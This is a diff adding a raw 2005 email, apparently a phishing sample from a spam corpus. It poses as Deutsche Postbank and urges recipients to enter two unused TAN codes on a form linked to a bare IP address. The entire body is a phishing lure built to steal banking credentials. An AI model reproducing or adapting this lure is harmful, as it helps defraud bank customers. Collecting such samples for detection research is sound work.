@@ -1,0 +1,130 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from example.com (example.com [192.168.2.0])
+	by example.com (Postfix) with ESMTP id B8E562A88C
+	for <user@example.com>; Thu,  7 Jul 2005 05:53:07 -0400 (EDT)
+Received: by example.com (Example mail relay)
+	id 816E063721; Thu,  7 Jul 2005 05:53:07 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by example.com (Example mail relay) with ESMTP id 4740963542
+	for <user@example.com>; Thu,  7 Jul 2005 09:53:07 +0000 (GMT)
+Received: (from user@localhost)
+	by mail.example.com id FAA03669
+	for user@example.com; Thu, 7 Jul 2005 05:53:07 -0400
+Received: from pool-71-110-105-219.lsanca.dsl-w.verizon.net (pool-71-110-105-219.lsanca.dsl-w.verizon.net [71.110.105.219])
+	by mail.example.com with ESMTP id FAA03661
+	for <user@example.com>; Thu, 7 Jul 2005 05:53:05 -0400
+Received: from unknown (HELO localhost) (127.0.0.1)
+    by localhost.eau.com with SMTP; Thu, 7 Jul 2005 13:03:26 +0000
+Received: from 139.199.201.182 (139.199.201.182[139.199.201.182])
+       by pool-71-110-105-219.lsanca.dsl-w.verizon.net (IMP) with HTTP
+       for <user@example.com>; Thu, 7 Jul 2005 13:03:26 +0000
+Message-ID: <7210381120741406@pool-71-110-105-219.lsanca.dsl-w.verizon.net>
+From: "Postbank" <support@postbank.de>
+To: "Kunde" <user@example.com>
+Subject: Warnung der Banksicherheitsdienst hinsichtlich der Internet - Misstaeter
+Date: Thu, 7 Jul 2005 13:03:26 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: 8bit
+User-Agent: Internet Messaging Program (IMP) 3.2.2
+X-Originating-IP: 139.199.201.182
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 26
+
+<HTML><html>
+<head>
+<title>Postbank</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<style type="text/css"><!--
+body, img {
+  border: 0px;
+  margin: 0px;
+}
+
+.text, .text * td {
+	font-family:arial,geneva,helvetica,sans-serif;
+	font-size: 12px;
+	color: #000066;
+	font-weight: normal;
+}
+
+.text a, .text * td a,
+.text a:active, .text * td a:active,
+.text a:visited, .text * td a:visited { 
+	font-family: arial,geneva,helvetica,sans-serif;
+	font-weight: bold;
+	color: #000066;
+	text-decoration: underline;
+}
+
+.text a:hover, .text * td a:hover { 
+	font-family: arial,geneva,helvetica,sans-serif;
+	font-weight: bold;
+	color: #000066;
+	text-decoration: none;
+}
+--></style>
+</head>
+<body bgcolor="#ffffff">
+<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" valign="top">
+	<tr height="100%">
+		<td width="50%"></td>
+		<td width="616" valign="top">
+			<table border="0" cellpadding="0" cellspacing="0" valign="top" width="616" height="100%">
+				<tr height="10">
+					<td width="616"><br><br></td>
+				</tr>
+				<tr height="16">
+					<td width="616" bgcolor="#000066"></td>
+				</tr>
+				<tr height="67">
+					<td width="616"><img src="http://219.240.142.59:8081/logo.jpg" width="616" height="67" alt=""></td>
+				</tr>
+				<tr height="16">
+					<td width="616" bgcolor="#cocceo"></td>
+				</tr>
+				<tr height="360">
+					<td width="616" valign="top" class="text">
+<br>
+Sehr geehrter Kunde!<br>
+Wir sind erfreut, Ihnen mitzuteilen, dass Internet - Ueberweisungen ueber unsere Bank noch sicherer geworden sind!<br> 
+Leider wurde von uns in der letzten Zeit, trotz der Anwendung von den TAN-Codes, eine ganze Reihe der Mitteldiebstaehle von den Konten unserer Kunden durch den Internetzugriff festgestellt.<br>
+Zur Zeit kennen wir die Methodik nicht, die die Missetaeter fuer die Entwendung der Angaben aus den TAN - Tabellen verwenden. Um die Missetaeter zu ermitteln und die Geldmittel von unseren Kunden unversehrt zu erhalten, haben wir entschieden, aus den TAN - Tabellen von unseren Kunden zwei aufeinanderfolgenden Codes zu entfernen.<br> 
+Dafuer muessen Sie unsere Seite besuchen, wo Ihnen angeboten wird, eine spezielle Form auszufuellen. In dieser Form werden Sie ZWEI  FOLGENDE TAN - CODEs, DIE SIE NOCH NICHT VERWENDET HABEN, EINTASTEN.<br>
+<br>
+<b>Achtung! Verwenden Sie diese zwei Codes in der Zukunft nicht mehr!</b><br>
+Wenn bei der Mittelueberweisung von Ihrem Konto gerade diese<br>
+TAN - Codes verwendet werden, so wird es fuer uns bedeuten, dass von Ihrem Konto eine nicht genehmigte Transitaktion ablaeuft und Ihr Konto wird unverzueglich bis zur Klaerung der Zahlungsumstaende gesperrt.<br>    
+<br>
+<div align="center"><a href="http://202.112.24.18:8081/"><img src="http://219.240.142.59:8081/clickhere.gif" width="150" height="30" alt=""></a></div>
+<br>
+Diese Massnahme dient Ihnen und Ihrem Geld zum Schutze! Wir bitten um Entschuldigung, wenn wir Ihnen die Unannehmlichkeiten bereitet haben.<br> 
+<br>
+Mit freundlichen Gruessen,<br>
+Bankverwaltung
+<br><br>
+				
+					</td>
+				</tr>
+				<tr height="16">
+					<td width="616" bgcolor="#cocceo"></td>
+				</tr>
+				<tr height="16">
+					<td width="616" align="right" class="text"><small>© 2004 Deutsche Postbank AG</small></td>
+				</tr>
+				<tr height="100%">
+					<td width="616"></td>
+				</tr>
+			</table>
+		</td>
+		<td width="50%"></td>	
+	</tr>
+</table>
+</body>
+</html>
+</HTML>
+
